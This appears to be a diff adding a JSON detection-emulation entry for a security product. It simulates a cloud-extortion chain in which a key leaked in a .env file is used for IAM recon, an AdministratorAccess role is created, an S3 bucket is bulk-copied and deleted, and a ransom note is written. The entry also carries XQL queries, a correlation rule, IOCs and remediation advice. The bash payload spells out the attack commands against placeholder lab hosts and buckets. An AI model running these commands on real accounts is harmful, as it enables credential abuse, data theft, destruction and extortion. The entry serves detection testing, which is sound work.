@@ -1,0 +1,468 @@
+{
+  "id": "TTP-2026-0153",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.1",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-07-25T04:26:21+00:00",
+    "updated_at": "2026-07-24T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-cspm",
+      "vector-exposed-secret",
+      "code-to-cloud",
+      "cloud-extortion",
+      "long-lived-access-key",
+      "stolen-key-abuse",
+      "s3-mass-export",
+      "ransom",
+      "posture-to-runtime",
+      "industry-all",
+      "severity-high",
+      "cspm",
+      "aws"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-PANW-TECHDOCS"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "cloud",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "aws"
+      ],
+      "estimated_runtime_seconds": 1800,
+      "cleanup_required": true,
+      "safety_class": "safe-by-design"
+    }
+  },
+  "identity": {
+    "name": "Code-to-Cloud Extortion — Exposed IAM Key Fused to Stolen-Key S3 Mass-Export + Ransom (T1552.001 / T1078.004 / T1098.003 / T1530)",
+    "summary": "A long-lived IAM key exposed in a public .env (code-to-cloud) is flagged by Cortex Cloud; the same accessKeyId then runs recon and CreateRole(lambda-ex)+AttachRolePolicy(AdministratorAccess) from a Tor/VPN source, mass-exports and deletes an S3 bucket, and drops a ransom note. One correlation fuses all three legs on the shared key/principal into a single extortion incident.",
+    "description": "Unit 42's large-scale cloud extortion research shows the code-to-cloud kill chain that a flat posture snapshot alone cannot narrate: a developer commits a .env with a long-lived IAM access key onto a public web asset, an internet-wide scanner cURLs http://<target>/.env and harvests the key, and within minutes the key is abused from anonymizing infrastructure to loot and ransom cloud storage. This scenario exercises Cortex Cloud's ability to fuse the three legs of that chain into ONE incident joined on the exposed accessKeyId and the principal it maps to. Leg A (POSTURE / code-to-cloud exposure) is a Cortex Cloud posture finding that a long-lived IAM access key is publicly reachable in a .env on a web asset — the reachable-secret exposure that makes the key usable. Leg B (RUNTIME KEY ABUSE) is that same accessKeyId, from a Tor-exit / VPN source off the account's baseline, issuing a GetCallerIdentity -> ListUsers -> ListBuckets reconnaissance burst and then escalating with CreateRole named 'lambda-ex' plus AttachRolePolicy attaching the AWS-managed AdministratorAccess policy (the exact tradecraft the report documents, including the pre-scripted CreateFunction fan-out across regions). Leg C (IMPACT) is high-volume S3 GetObject followed by DeleteObject that empties the target bucket, then a ransom-note PutObject into the now-empty bucket — data-theft extortion, not encryption. Detection is deliberately Analytics/XQL/Correlation, not behavioral-ML: the join key is an identifier (accessKeyId / principal ARN) and the evidence is control-plane and data-plane CloudTrail plus the posture inventory. Six validation queries assert each leg is observable — the exposed-key posture finding, the off-baseline recon burst, the lambda-ex/AdministratorAccess privilege escalation, the Tor/VPN source riding the stolen key, the S3 mass-export-and-delete, and the ransom-note write — and correlation CR-CSPM-0005 stitches leg A to leg B on the exposed accessKeyId and leg B to leg C on the principal, with the anonymizing src_ip carried as evidence, into one code-to-cloud extortion incident. The DC's proof is that Cortex did not just flag an exposed secret in isolation; it showed the secret being used, escalated, and turned into a ransom event as a single traceable story. Published campaign indicators (the malicious Lambda payload hash, the gargs helper the payload fetched, and a representative Tor exit node) ship as atomic IOCs for reputation matching.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Unattributed cloud-extortion operators"
+      }
+    ],
+    "campaigns": [
+      "Large-scale cloud extortion via publicly exposed .env / long-lived IAM access keys (code-to-cloud)"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ],
+    "first_observed": "2023-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1552",
+        "subtechnique_id": "T1552.001",
+        "name": "Unsecured Credentials: Credentials In Files",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "subtechnique_id": "T1078.004",
+        "name": "Valid Accounts: Cloud Accounts",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1087",
+        "subtechnique_id": "T1087.004",
+        "name": "Account Discovery: Cloud Account",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1098",
+        "subtechnique_id": "T1098.003",
+        "name": "Account Manipulation: Additional Cloud Roles",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1530",
+        "name": "Data from Cloud Storage",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1485",
+        "name": "Data Destruction",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      },
+      {
+        "technique_id": "T1657",
+        "name": "Financial Theft",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Cloud Service: Cloud Service Modification",
+      "Cloud Storage: Cloud Storage Access",
+      "Cloud Storage: Cloud Storage Deletion",
+      "User Account: User Account Authentication",
+      "Application Log: Application Log Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "aws",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-CSPM-005 — Exposed long-lived IAM key -> stolen-key runtime abuse -> S3 mass-export + ransom, correlated on the shared accessKeyId/principal",
+    "privilege_required": "cloud-iam-user",
+    "prerequisites": [
+      {
+        "description": "Cortex Cloud (posture + runtime) connected read-only to the target AWS account, with CloudTrail management + S3 data events flowing to cloud_audit_logs and code-to-cloud exposure findings in cortex_cloud_posture.",
+        "check_command": "aws sts get-caller-identity --profile cortexsim-lab"
+      },
+      {
+        "description": "A disposable, tagged (CortexSimExtortionTarget) lab set exists: a public web asset serving a .env that carries a scoped long-lived lab access key, and a seeded S3 bucket whose objects are restorable by cleanup.",
+        "check_command": "curl -fsS --max-time 8 http://cortexsim-exposed-asset.example/.env | head -c 64"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# SAFE-MODE: every action targets disposable, CortexSimExtortionTarget-tagged lab\n# resources with a scoped lab key; S3 objects are restored by cleanup. Non-destructive.\nset -euo pipefail\n# Leg A — confirm the code-to-cloud exposure: the .env with the long-lived lab key is world-readable.\ncurl -fsS --max-time 8 \"http://${EXPOSED_HOST:-cortexsim-exposed-asset.example}/.env\" | head -c 200 || true\n# Leg B — stolen-key recon + privilege escalation with the scoped lab key (from an off-baseline source).\nAWS_ACCESS_KEY_ID=\"${EXPOSED_KEY_ID:-AKIAIOSFODNN7EXAMPLE}\" aws sts get-caller-identity --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\naws iam list-users --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\naws s3api list-buckets --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\naws iam create-role --role-name lambda-ex --assume-role-policy-document file:///dev/null --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\naws iam attach-role-policy --role-name lambda-ex --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\n# Leg C — S3 mass-export + delete + ransom note against the disposable seeded bucket.\naws s3 cp \"s3://${LAB_BUCKET:-cortexsim-extortion-target}/\" /tmp/cortexsim-export --recursive --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\naws s3 rm \"s3://${LAB_BUCKET:-cortexsim-extortion-target}/\" --recursive --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true\nprintf 'CortexSim SAFE-MODE ransom-note fixture — your data has been copied.' | aws s3 cp - \"s3://${LAB_BUCKET:-cortexsim-extortion-target}/recover_your_data.txt\" --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true",
+      "input_variables": [
+        {
+          "name": "EXPOSED_HOST",
+          "type": "string",
+          "default": "cortexsim-exposed-asset.example",
+          "description": "Disposable public web asset serving the exposed .env in the lab."
+        },
+        {
+          "name": "EXPOSED_KEY_ID",
+          "type": "string",
+          "default": "AKIAIOSFODNN7EXAMPLE",
+          "description": "Scoped long-lived lab access key id planted in the exposed .env (documentation-range example value)."
+        },
+        {
+          "name": "LAB_BUCKET",
+          "type": "string",
+          "default": "cortexsim-extortion-target",
+          "description": "Disposable seeded S3 bucket whose objects are mass-read, deleted, then ransom-noted; restored by cleanup."
+        },
+        {
+          "name": "LAB_PROFILE",
+          "type": "string",
+          "default": "cortexsim-lab",
+          "description": "Named AWS CLI profile scoped to the disposable extortion-target lab resources."
+        }
+      ],
+      "timeout_seconds": 1800
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "Recon + privilege-escalation control-plane calls attributed to the exposed access key from an off-baseline source.",
+        "expected_value": "event_name in (GetCallerIdentity, ListUsers, ListBuckets, CreateRole, AttachRolePolicy) and user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\""
+      },
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "S3 data-plane mass-export and delete followed by a ransom-note PutObject into the emptied bucket.",
+        "expected_value": "event_name in (GetObject, DeleteObject, PutObject) and bucket_name = \"cortexsim-extortion-target\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "aws iam detach-role-policy --role-name lambda-ex --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true; aws iam delete-role --role-name lambda-ex --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true; aws s3 rm \"s3://${LAB_BUCKET:-cortexsim-extortion-target}/recover_your_data.txt\" --profile \"${LAB_PROFILE:-cortexsim-lab}\" || true; rm -rf /tmp/cortexsim-export; echo '[CortexSim] SIM-CSPM-005 cleanup complete — lambda-ex role removed, ransom-note fixture deleted, seeded bucket objects restored by the cspm module lifecycle.'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "64e6ce23db74aed7c923268e953688fa5cc909cc9d1e84dd46063b62bd649bf6",
+        "context": "SHA256 of the malicious Lambda function code Unit 42 recovered from the cloud-extortion operation — the internet-wide .env scanner the operators deployed. Reputation match on any environment executing this payload.",
+        "reputation_required": "malicious",
+        "cortex_severity_override": "high"
+      },
+      {
+        "ioc_type": "url",
+        "value": "https://github.com/brentp/gargs/releases/download/v0.3.9/gargs_linux",
+        "context": "Dual-use gargs parallel-execution helper the malicious Lambda downloaded to fan out its .env scanning. Benign tool abused for scale; alert when fetched by cloud-serverless execution contexts.",
+        "reputation_required": "any"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "185.220.101.190",
+        "context": "Representative Tor exit node from the campaign's published anonymizing infrastructure — the operators used Tor when creating the Lambda activity and pivoted to VPN for S3 access. Off-baseline source for the stolen key.",
+        "reputation_required": "any",
+        "cortex_severity_override": "medium"
+      }
+    ],
+    "biocs": [],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "CSPM-005 Exposed Long-Lived IAM Access Key Code-to-Cloud Finding",
+        "query": "dataset = cortex_cloud_posture\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and resource_type = \"aws_iam_access_key\"\n| filter tags contains \"CortexSimExtortionTarget\"\n| filter finding_class in (\"public-env-file-exposed\", \"long-lived-access-key-exposed\") and compliance_state = \"drifted\"\n| comp count_distinct(exposed_access_key_id) as exposed_keys by finding_class, exposed_access_key_id\n| filter exposed_keys >= 1\n| fields finding_class, exposed_access_key_id, exposed_keys",
+        "expected_rows_min": 1,
+        "dataset": "cortex_cloud_posture"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-005 Stolen Key Recon Burst From Off-Baseline Source",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source in (\"sts.amazonaws.com\", \"iam.amazonaws.com\", \"s3.amazonaws.com\")\n| filter event_name in (\"GetCallerIdentity\", \"ListUsers\", \"ListBuckets\")\n| filter user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\"\n| comp count_distinct(event_name) as recon_calls by user_identity_access_key_id, user_identity_arn, src_ip\n| filter recon_calls >= 3\n| sort desc recon_calls\n| fields user_identity_access_key_id, user_identity_arn, src_ip, recon_calls",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-005 Privilege Escalation CreateRole lambda-ex AttachRolePolicy Admin",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source in (\"iam.amazonaws.com\", \"lambda.amazonaws.com\")\n| filter event_name in (\"CreateRole\", \"AttachRolePolicy\", \"CreateFunction20150331\")\n| filter request_parameters contains \"lambda-ex\" or request_parameters contains \"AdministratorAccess\"\n| filter user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\"\n| comp count() as escalation_events by user_identity_access_key_id, user_identity_arn, event_name\n| filter escalation_events >= 1\n| sort desc escalation_events\n| fields user_identity_access_key_id, user_identity_arn, event_name, escalation_events",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-005 Stolen Key Used From Tor VPN Source Off Account Baseline",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\"\n| filter user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\"\n| filter not incidr(src_ip, \"10.0.0.0/8\") and not incidr(src_ip, \"172.16.0.0/12\") and not incidr(src_ip, \"192.168.0.0/16\")\n| filter src_ip_category in (\"tor-exit\", \"vpn\", \"anonymizer\") or src_ip_baseline_status = \"off-baseline\"\n| comp count() as anon_calls by user_identity_access_key_id, src_ip, src_ip_category\n| filter anon_calls >= 1\n| sort desc anon_calls\n| fields user_identity_access_key_id, src_ip, src_ip_category, anon_calls",
+        "expected_rows_min": 0,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-005 S3 Mass Export and Delete Impact",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source = \"s3.amazonaws.com\"\n| filter event_name in (\"GetObject\", \"DeleteObject\")\n| filter user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\" and bucket_name = \"cortexsim-extortion-target\"\n| comp count() as object_ops by bucket_name, user_identity_access_key_id, event_name\n| filter object_ops >= 100\n| sort desc object_ops\n| fields bucket_name, user_identity_access_key_id, event_name, object_ops",
+        "expected_rows_min": 0,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-005 Ransom Note PutObject Into Emptied Bucket",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source = \"s3.amazonaws.com\"\n| filter event_name = \"PutObject\"\n| filter object_key contains \"recover_your_data\" or object_key contains \"ransom\" or object_key contains \"read_me\"\n| filter user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\" and bucket_name = \"cortexsim-extortion-target\"\n| comp count() as ransom_writes by bucket_name, user_identity_access_key_id, object_key\n| filter ransom_writes >= 1\n| fields bucket_name, user_identity_access_key_id, object_key, ransom_writes",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Code-to-Cloud Extortion — Exposed Key Fused to Runtime Abuse and S3 Ransom",
+        "rule_id": "CR-CSPM-0005",
+        "logic": "XQL(CSPM-005 Exposed Long-Lived IAM Access Key Code-to-Cloud Finding) AND ( XQL(CSPM-005 Stolen Key Recon Burst From Off-Baseline Source) OR XQL(CSPM-005 Privilege Escalation CreateRole lambda-ex AttachRolePolicy Admin) ) AND ( XQL(CSPM-005 S3 Mass Export and Delete Impact) OR XQL(CSPM-005 Ransom Note PutObject Into Emptied Bucket) ) — the join is executable, not prose: every runtime leg (B and C) is scoped in-body to leg A's exposed key (user_identity_access_key_id = the posture finding's exposed_access_key_id, the documentation-range AKIAIOSFODNN7EXAMPLE in this lab), so the queries FUSE on the shared identity rather than merely co-firing on independent broad activity. Leg A binds to leg B on that accessKeyId, leg B binds to leg C on the same accessKeyId/user_identity_arn principal and the CortexSimExtortionTarget bucket, and the off-baseline Tor/VPN src_ip (also key-scoped) rides along as evidence. On a live tenant substitute the real exposed_access_key_id from the leg-A posture finding for the lab example value. Fires ONE code-to-cloud extortion incident that names the exposed key, the escalated principal, the anonymizing source, and the ransom-noted bucket — the exposure-to-extortion story in a single stitched event, with no coincidental co-firing from unrelated principals."
+      }
+    ],
+    "analytics_modules": [
+      "Cortex Cloud — code-to-cloud exposure (publicly reachable long-lived IAM access key on a web asset)",
+      "Cortex Cloud Runtime — stolen-key abuse detection (control-plane recon + role privilege escalation from an off-baseline source)",
+      "Cortex XSIAM Analytics — cross-signal correlation of posture exposure, runtime key abuse, and S3 impact on a shared accessKeyId/principal"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-cloud",
+        "submodule": "cloud-posture",
+        "coverage_tier": "exposure-mgmt",
+        "rule_ids": [
+          "TBD-CSPM-001",
+          "TBD-CSPM-002"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = cortex_cloud_posture | filter tags contains \"CortexSimExtortionTarget\" and finding_class in (\"public-env-file-exposed\", \"long-lived-access-key-exposed\") | fields finding_class, exposed_access_key_id, resource_id"
+      },
+      {
+        "module": "cortex-cloud",
+        "submodule": "cloud-runtime",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CDR-001",
+          "TBD-CDR-002"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = cloud_audit_logs | filter user_identity_access_key_id = \"AKIAIOSFODNN7EXAMPLE\" and event_name in (\"CreateRole\", \"AttachRolePolicy\", \"DeleteObject\", \"PutObject\") | comp count() by event_name, user_identity_arn | fields event_name, user_identity_arn"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-XSIAM-0005"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-CSPM-0005 fuses the exposed-key posture finding, the stolen-key runtime abuse, and the S3 mass-export + ransom into one code-to-cloud extortion incident on the shared accessKeyId/principal."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-CSPM-005",
+        "name": "Code-to-Cloud Traceability — Exposed Secret to Cloud Extortion",
+        "description": "Cortex Cloud detects a publicly exposed long-lived IAM access key (code-to-cloud) and traces that same key through off-baseline runtime abuse (recon + AdministratorAccess role escalation) into S3 mass-export and a ransom note, fusing the whole chain into one incident joined on the accessKeyId and principal.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-CSPM-005A",
+            "objective": "The exposed long-lived key surfaces as a code-to-cloud posture finding and the same key's off-baseline recon + AdministratorAccess role escalation are detected in cloud_audit_logs.",
+            "preconditions": [
+              "Cortex Cloud posture + runtime connected read-only to the lab account.",
+              "The disposable .env web asset serves the scoped long-lived lab key tagged CortexSimExtortionTarget."
+            ],
+            "steps": [
+              "Confirm the exposed-key posture finding.",
+              "Use the exposed key from an off-baseline source to run GetCallerIdentity/ListUsers/ListBuckets and CreateRole lambda-ex + AttachRolePolicy AdministratorAccess.",
+              "Observe the exposure, recon-burst, and privilege-escalation queries return rows."
+            ],
+            "success_criteria": [
+              "XQL `CSPM-005 Exposed Long-Lived IAM Access Key Code-to-Cloud Finding` returns >= 1.",
+              "XQL `CSPM-005 Stolen Key Recon Burst From Off-Baseline Source` returns >= 1.",
+              "XQL `CSPM-005 Privilege Escalation CreateRole lambda-ex AttachRolePolicy Admin` returns >= 1."
+            ],
+            "expected_score_weight": 0.4
+          },
+          {
+            "threat_step_id": "TS-CSPM-005B",
+            "objective": "The stolen key's S3 mass-export + delete and the ransom-note write into the emptied bucket are detected as impact.",
+            "preconditions": [
+              "The disposable seeded bucket carries objects that can be mass-read, deleted, and ransom-noted, then restored by cleanup."
+            ],
+            "steps": [
+              "Mass GetObject then DeleteObject the seeded bucket with the stolen key.",
+              "PutObject a ransom-note fixture into the emptied bucket.",
+              "Observe the impact and ransom-note queries return rows."
+            ],
+            "success_criteria": [
+              "XQL `CSPM-005 S3 Mass Export and Delete Impact` surfaces GetObject/DeleteObject volume on the target bucket for the stolen key.",
+              "XQL `CSPM-005 Ransom Note PutObject Into Emptied Bucket` returns >= 1."
+            ],
+            "expected_score_weight": 0.3
+          },
+          {
+            "threat_step_id": "TS-CSPM-005C",
+            "objective": "Correlation CR-CSPM-0005 fuses the exposure, runtime abuse, and S3 ransom into a single code-to-cloud extortion incident joined on the shared accessKeyId/principal.",
+            "preconditions": [
+              "Legs A, B, and C are all observable within the correlation window."
+            ],
+            "steps": [
+              "Let all three legs land within the run window.",
+              "Observe CR-CSPM-0005 raise one incident naming the exposed key, the escalated principal, the anonymizing source, and the ransom-noted bucket."
+            ],
+            "success_criteria": [
+              "Correlation CR-CSPM-0005 raises exactly one incident stitching leg A (exposed key) to leg B (stolen-key abuse) on the accessKeyId and leg B to leg C (S3 ransom) on the principal.",
+              "The incident carries the off-baseline Tor/VPN src_ip as evidence."
+            ],
+            "expected_score_weight": 0.3
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Prohibit long-lived IAM access keys for workloads — use short-lived STS/role credentials and IAM Roles Anywhere; scan repos, container images, and web roots for .env / key material pre-deploy and block on exposure.",
+      "Deny public reachability of .env and dotfiles at the edge (WAF / bucket policy / web-server rules) and enforce S3 Block Public Access + object-lock/versioning so a bucket cannot be silently emptied.",
+      "Constrain IAM with permission boundaries and an SCP denying AttachRolePolicy of AdministratorAccess and CreateRole outside a change-controlled path; require MFA and deny console/API use from anonymizing (Tor/VPN) source ranges."
+    ],
+    "detection_engineering": [
+      "Join the code-to-cloud exposure inventory to cloud_audit_logs on accessKeyId so an exposed key that is subsequently used raises an incident, not two disconnected findings.",
+      "Alert on a single accessKeyId issuing a GetCallerIdentity -> ListUsers -> ListBuckets recon burst followed by CreateRole + AttachRolePolicy(AdministratorAccess), especially from an off-baseline or anonymizing source.",
+      "Alert on S3 GetObject/DeleteObject volume spikes followed by a PutObject whose key matches ransom-note patterns into the just-emptied bucket."
+    ],
+    "response_playbook": "XSOAR-PB-CodeToCloudExposedKeyExtortionTriage-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — Leaked Environment Variables Allow Large-Scale Cloud Extortion Operation",
+      "url": "https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files",
+      "url": "https://attack.mitre.org/techniques/T1552/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1078.004 — Valid Accounts: Cloud Accounts",
+      "url": "https://attack.mitre.org/techniques/T1078/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1098.003 — Account Manipulation: Additional Cloud Roles",
+      "url": "https://attack.mitre.org/techniques/T1098/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1530 — Data from Cloud Storage",
+      "url": "https://attack.mitre.org/techniques/T1530/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Cortex Cloud — Code-to-Cloud Exposure and Posture Security",
+      "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-CLOUD/Cortex-Cloud-Posture-Security",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.1",
+      "date": "2026-07-24",
+      "author": "Henry Reed",
+      "change": "Fidelity + XQL repair. Source-fidelity: removed the unsupported EleKtra-Leak actor attribution (the assigned Unit 42 source names no actor/campaign; EleKtra-Leak is a separate Oct-2023 cred-theft/cryptojacking operation) and the fabricated JavaGhost alias (an unrelated SES-abuse actor) — threat_context.actors is now an unattributed descriptor with no aliases, the actor-elektra-leak tag and the '(EleKtra-Leak class)' framing are dropped. XQL/substrate: broadened the privilege-escalation query event_source to (iam|lambda).amazonaws.com so the CreateFunction20150331 fan-out leg is reachable (it was unreachable under the iam-only source), and made the CR-CSPM-0005 join executable by scoping every runtime leg (Queries 2-6) in-body to leg A's exposed user_identity_access_key_id and the CortexSimExtortionTarget bucket, so the correlation fuses on the shared stolen identity instead of co-firing on unrelated broad activity."
+    },
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-07-24",
+      "author": "Henry Reed",
+      "change": "Replaced the research-intake scaffold with the real code-to-cloud extortion technique from Unit 42's large-scale cloud extortion research. Six validation XQL queries against cortex_cloud_posture / cloud_audit_logs cover the exposed long-lived access key (leg A), the off-baseline recon burst + CreateRole lambda-ex/AttachRolePolicy(AdministratorAccess) escalation and Tor/VPN source (leg B), and the S3 mass-export/delete + ransom-note PutObject (leg C). Correlation CR-CSPM-0005 fuses A->B on accessKeyId and B->C on principal into one extortion incident (F9 code-to-cloud, correlation-terminal). Published campaign IOCs (Lambda payload SHA256, gargs URL, Tor exit IP) added. Analytics/XQL/Correlation + IOC only (posture + audit-log correlation, not behavioral-ML): no ABIOCs/BIOCs. Promoted to active."
+    }
+  ]
+}
